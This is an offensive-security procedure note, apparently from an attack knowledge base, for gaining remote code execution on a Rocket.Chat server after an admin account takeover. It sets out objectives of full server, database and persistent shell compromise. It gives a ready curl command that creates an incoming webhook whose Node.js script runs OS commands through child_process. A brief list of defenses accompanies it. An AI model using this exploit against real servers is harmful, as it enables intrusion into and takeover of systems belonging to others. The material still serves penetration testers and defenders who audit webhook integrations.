---
id: proc-rocket-webhook-rce
tags:
  - rce
  - webhook-exploit
  - execution
type: procedure
tools:
  - '[[tools/Python3]]'
  - '[[tools/requests]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-create-webhook]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T03:46:19.926Z'
skill_level: intermediate
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Create-Malicious-Incoming-Webhook-for-RCE-After-Takeover

## Summary

This procedure uses admin privileges post-takeover to create an incoming webhook in Rocket.Chat that executes arbitrary Node.js scripts server-side without isolation, enabling remote code execution.

## Description

After logging in as admin, POST to /api/v1/integrations.create with a script payload using Node's child_process to run OS commands. The webhook runs in the Rocket.Chat process context (as 'rocketchat' user), allowing full server control, database access, and lateral movement.

## Requirements

1. Admin account access post-takeover
2. Auth token and user ID from login
3. Target URL
4. Knowledge of Node.js exec syntax

## Defense

Defensive measures and detection strategies:

- Disable or sandbox incoming webhooks
- Review and audit all webhook scripts before enabling
- Run Rocket.Chat in a container with restricted privileges
- Monitor process executions from app context

## Objectives

1. Achieve arbitrary code execution on server
2. Compromise database and connected systems
3. Gain persistent shell access

## Instructions

### Step 1: Create Webhook with Malicious Script

**Context**: Authenticate and submit webhook config with exec payload.

**Command** ([[commands/curl-create-webhook]]):
```bash
curl -X POST 'http://target:3000/api/v1/integrations.create' -H 'X-Auth-Token: admin_token' -H 'X-User-Id: admin_id' -H 'Content-Type: application/json' -d '{"type":"Incoming","name":"RCE Webhook","channel":"#general","script":"require(\"child_process\").exec(\"touch /tmp/rce_pwned\")"}'
```

> Response includes webhook URL/ID; trigger to execute.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/curl-create-webhook]]

## Tools Used

- [[tools/Python3]]
- [[tools/requests]]

## Tags

- rce
- webhook-exploit
- execution
